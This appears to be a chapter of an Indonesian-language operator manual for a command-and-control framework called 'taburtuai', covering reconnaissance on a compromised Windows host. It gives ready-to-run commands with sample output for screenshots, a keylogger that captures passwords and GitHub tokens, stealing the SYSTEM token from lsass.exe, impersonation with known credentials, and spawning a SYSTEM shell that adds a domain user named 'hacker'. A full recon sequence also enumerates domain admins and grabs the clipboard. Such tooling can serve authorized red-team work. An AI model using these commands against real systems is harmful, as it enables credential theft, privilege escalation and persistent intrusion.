# 13 — Reconnaissance

## Screenshot Desktop

Ambil screenshot penuh desktop target secara real-time.

```
taburtuai(IP:8000) › screenshot 2703886d --wait
```

**Output:**
```
[*] Capturing screenshot on DESKTOP-QLPBF95...
[+] Screenshot captured.

    Resolution : 2560x1440
    Format     : PNG
    Size       : 892,341 bytes (871 KB)

[i] Simpan: result <cmd-id> --save ./loot/screenshot.png
```

---

## Keylogger

### Mulai Keylogger

```
taburtuai(IP:8000) › keylog start 2703886d --wait
```

**Output:**
```
[+] Keylogger started. Keystroke buffer aktif.
[i] Ambil: keylog dump 2703886d
[i] Stop : keylog stop 2703886d
```

### Mulai dengan Auto-Stop

```
taburtuai(IP:8000) › keylog start 2703886d --duration 300 --wait
# Auto-stop setelah 300 detik (5 menit)
```

### Dump Buffer Keystrokes

```
taburtuai(IP:8000) › keylog dump 2703886d --wait
```

**Output:**
```
[+] Keystroke buffer dump (4,821 bytes):

[2026-04-23 09:12:01] [CHROME] https://mail.corp.local
john.doe@corp.local[TAB]CorpMail@2026![ENTER]

[2026-04-23 09:14:33] [CHROME] https://github.com
johndoe-dev[TAB]ghp_abc123xyz456[ENTER]

[2026-04-23 09:18:45] [NOTEPAD]
Server: db-prod.corp.local
Username: dbadmin
Password: DB@dm1nProd!

[2026-04-23 09:22:17] [WINLOGON]
john.doe[TAB]CorpWindow$2026[ENTER]
```

### Stop Keylogger

```
taburtuai(IP:8000) › keylog stop 2703886d --wait
```

**Output:**
```
[+] Keylogger stopped. Final buffer (5,234 chars):

[2026-04-23 09:35:12] [CHROME] https://vpn.corp.local
john.doe[TAB]VPN_S3cur3![ENTER]
```

### Bersihkan Buffer

Hapus buffer tanpa stop keylogger dan tanpa mengembalikan konten:

```
taburtuai(IP:8000) › keylog clear 2703886d --wait
# [+] Keystroke buffer cleared. Keylogger tetap berjalan.
```

---

## Token Enumeration

List semua proses dan token info (user, integrity, privilege):

```
taburtuai(IP:8000) › token list 2703886d --wait
```

**Output:**
```
[+] Token enumeration for DESKTOP-QLPBF95:

PID    NAME                       USER                    INTEGRITY   ELEVATED
-----  -------------------------  ----------------------  ----------  --------
724    lsass.exe                  NT AUTHORITY\SYSTEM     System      Yes
3048   explorer.exe               CORP\john.doe           Medium      No
6720   cmd.exe (elevated)         CORP\Administrator      High        Yes
4512   agent_windows_stealth.exe  CORP\john.doe           Medium      No
```

---

## Token Steal (Impersonation)

```
taburtuai(IP:8000) › token steal 2703886d --pid 724 --wait
```

**Output:**
```
[*] Opening PID 724 (lsass.exe)...
[+] Token stolen. Now impersonating: NT AUTHORITY\SYSTEM

[i] Verifikasi: cmd 2703886d "whoami"
```

```
taburtuai(IP:8000) › cmd 2703886d "whoami"
# NT AUTHORITY\SYSTEM
```

---

## Token Make (LogonUser)

Buat token dari kredensial yang diketahui:

```
taburtuai(IP:8000) › token make 2703886d \
  --user john.doe \
  --domain CORP \
  --pass "CorpMail@2026!" \
  --wait
```

**Output:**
```
[+] LogonUser succeeded. Impersonating: CORP\john.doe
```

---

## Token RunAs

Spawn proses dalam konteks user lain:

```
taburtuai(IP:8000) › token runas 2703886d \
  --pid 724 \
  --exe "cmd.exe" \
  --args "/c net user hacker P@ss123! /add /domain" \
  --wait
```

**Output:**
```
[+] cmd.exe (PID: 9120) spawned as NT AUTHORITY\SYSTEM.
```

---

## Token Revert

```
taburtuai(IP:8000) › token revert 2703886d --wait
# [+] Reverted to: CORP\john.doe (Medium)
```

---

## Skenario Reconnaissance Lengkap

```
# Screenshot awal (lihat apa yang sedang dikerjakan user)
screenshot 2703886d --wait

# Start keylogger 10 menit
keylog start 2703886d --duration 600 --wait

# Sambil keylog berjalan — enumerasi domain
cmd 2703886d "net group 'Domain Admins' /domain" --method powershell --wait
cmd 2703886d "net group 'Enterprise Admins' /domain" --method powershell --wait
cmd 2703886d "Get-ADComputer -Filter * | Select Name,OperatingSystem" --method powershell --timeout 60 --wait

# Enumerasi token untuk target impersonation
token list 2703886d --wait

# Ambil hasil keylogger
keylog stop 2703886d --wait

# Clipboard check
creds clipboard 2703886d --wait

# Screenshot kedua
screenshot 2703886d --wait
```

---

**Selanjutnya:** [14 — Network & Pivoting](14-network.md)
